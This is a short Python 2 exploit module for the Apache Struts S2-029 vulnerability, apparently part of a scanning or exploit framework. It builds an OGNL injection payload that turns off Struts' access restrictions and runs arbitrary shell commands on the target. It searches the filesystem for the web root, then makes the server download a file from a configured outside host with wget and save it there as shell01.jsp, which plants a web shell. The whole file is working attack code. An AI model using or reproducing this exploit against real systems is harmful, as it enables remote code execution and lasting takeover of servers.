# coding:utf-8
import sys
import re
from EXP.exp_template import Exploit, Level, session

from conf import config
"""
构造函数需要传递以下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/07/05
done:
获取webpath
只能使用wget下载文件
"""


class S2029(Exploit):

    def meta_info(self):
        return {
            'name': 'S2-029',
            'author': 'swm',
            'date': '2018/07/05'
        }

    def executecmd(self, command):
        poc = "(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true," \
              "%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties']," \
              "%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess" \
              "['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true," \
              "@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{}').getInputStream()))".format(command)
        commandurl = self.url + poc
        s = session()
        try:
            r = s.get(commandurl, timeout=5)
            resp = r.text.encode("utf-8")
            return resp
        except:
            return False

    # 获取web文件的路径
    def getwebpath(self):
        cmd = 'find / -name *.jsp'
        re_webpath = re.compile(r'value="(\/.+webapps\/\w+\/)')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            self.report('webpath:{}'.format(webpath.group(1)), Level.info)
            return webpath.group(1)
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        # 获取webapp的根目录
        webpath = self.getwebpath()
        if webpath:
            self.wgetfile(config['serverurl'], webpath)
            return True
        else:
            return False


if __name__ == '__main__':
    url = 'http://localhost:8087/default.action?message='
    s = S2029(url)
    res = s.exploit()
    print res
    # if len(sys.argv) == 2:
    #     s = S2DEVMODE(sys.argv[1])
    #     res = s.exploit()
    #     print res
